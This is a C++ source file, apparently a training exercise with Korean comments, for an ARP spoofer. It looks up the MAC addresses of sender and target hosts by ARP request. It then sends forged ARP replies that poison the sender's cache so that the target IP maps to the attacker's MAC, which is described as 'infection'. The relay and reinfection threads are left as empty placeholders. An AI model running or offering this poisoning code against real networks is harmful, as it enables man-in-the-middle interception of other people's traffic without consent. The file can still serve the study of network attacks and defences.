#include "pch.h"
#include "ethhdr.h"
#include "mac.h"
#include "ip.h"
#include "arphdr.h"
#include "packetmanager.h"
#include "addressmanager.h"
#include "etharp.h"
#define THREAD_NUM 2

// 입력받은 sender ip와 target ip 페어를 u_int32_t로 저장해야겠다 안그러면, 나중에 형변환이 까다로움 
void usage() {
	printf("syntax: arp_spoofer.out <interface> {sender_ip , target_ip } ...\n");
	printf("sample: send-arp-test wlan0 1.1.1.2 1.1.1.1\n");
}

/* target_ip와 대응하는 mac주소가 올때까지 packet을 받는다 */
bool getMac(Ip target_ip,PacketManager& packetmanager,AddressManager& addrmanager){
	const u_char* packet; 
	struct pcap_pkthdr* header;
	int res = packetmanager.packetCapture(packet,header);
	struct EthArpPacket *etharphdr = (struct EthArpPacket*)packet;
	struct EthHdr ethhdr = etharphdr->eth_;
	struct ArpHdr arphdr = etharphdr->arp_;
	if(ntohs(ethhdr.type_)!=0x0806) return false;
	Ip s_ip = ntohl(arphdr.sip_);
	Mac s_mac = arphdr.smac_;
	Ip t_ip = ntohl(arphdr.tip_);
	Mac t_mac = arphdr.tmac_;
	if(string(s_ip)==string(target_ip) && string(t_mac)==string(addrmanager.getMyMac())){
		addrmanager.pushMac(s_ip,s_mac);
		return true;
	}
	else return false;
}

int main(int argc, char* argv[]) {
	if (argc < 4 || argc%2!=0) {
		usage();
		return -1;
	}
	/* 클래스 초기화 */
	char* dev = argv[1]; 
	AddressManager addrmanager = AddressManager(string(dev));
	PacketManager packetmanager = PacketManager(string(dev));

	/* sender ip 및 target ip 페어 초기화 */
	for(int i=2;i<argc-1;i+=2){
		addrmanager.addIpPair(string(argv[i]),string(argv[i+1]));
	}
	cout<<"=======================IP 및 MAC 주소 질의 =========================="<<endl;
	/* arp request 프로토콜로 Ip들의 Mac 주소를 질의 */
    for(int i=0;i<addrmanager.getCounter();i++){
		pair<Ip,Ip> ipPair = addrmanager.getIpPair(i);
		Ip sender = ipPair.first;
		Ip target = ipPair.second;
		/* sender mac 주소 질의 */
		packetmanager.sendArpPacket("FF:FF:FF:FF:FF:FF",string(addrmanager.getMyMac()),string(addrmanager.getMyIp()),"00:00:00:00:00:00",string(sender),1);
		while(true){
			if(getMac(sender,packetmanager,addrmanager)) break;
		}
		cout<<"----------------------------------------------------------------"<<endl;
		cout<<"[X] sender"<<endl;
		cout<<"IP: "<<string(sender)<<endl;
		cout<<"MAC: "<<addrmanager.getMacString(sender)<<endl;
		/* target mac 주소 질의 */
		packetmanager.sendArpPacket("FF:FF:FF:FF:FF:FF",string(addrmanager.getMyMac()),string(addrmanager.getMyIp()),"00:00:00:00:00:00",string(target),1);
		while(true){ // 조건을 만족하는 패킷이 나올때까지 queue에 담긴 패킷을 필터링 
			if(getMac(target,packetmanager,addrmanager)) break;
		}
		cout<<"[X] target"<<endl;
		cout<<"IP: "<<string(target)<<endl;
		cout<<"MAC: "<<addrmanager.getMacString(target)<<endl;
		cout<<"-------------------------------------------------------------------"<<endl;
	}
	cout<<"======================================================================"<<endl;
	/* arp cache table 감염 */
	for(int i=0;i<addrmanager.getCounter();i++){
		pair<Ip,Ip> ipPair = addrmanager.getIpPair(i);
		Ip sender = ipPair.first;
		Ip target = ipPair.second;
		string sender_ip = string(sender);
		string target_ip = string(target);
		string sender_mac = addrmanager.getMacString(sender_ip);
		string target_mac = addrmanager.getMacString(target_ip);
		string my_mac = string(addrmanager.getMyMac());
		packetmanager.sendArpPacket(sender_mac,my_mac,target_ip,sender_mac,sender_ip,2); /* 2번 타입 reply */
	}
	/* Thread 생성 */
	/* 1. packet relay thread */
	/* 2. packet infection thread */
	pthread_t threads[THREAD_NUM];
	int result;

	/* Producer & Consumer Pattern */
	/*
		하나의 sender ip에 대하여
			1. 패킷을 릴레이 하기 
			2. 	감염시키기 
		위 두개를 번갈아가면서 진행함
	*/

	for(int i=0;i<addrmanager.getCounter();i++){
		
	}


	/* packet relay thread 생성 */

	/* arp broadcast감지 thread 생성 */
	

	/* 연결 종료 */
	packetmanager.close();
    return 0;
}
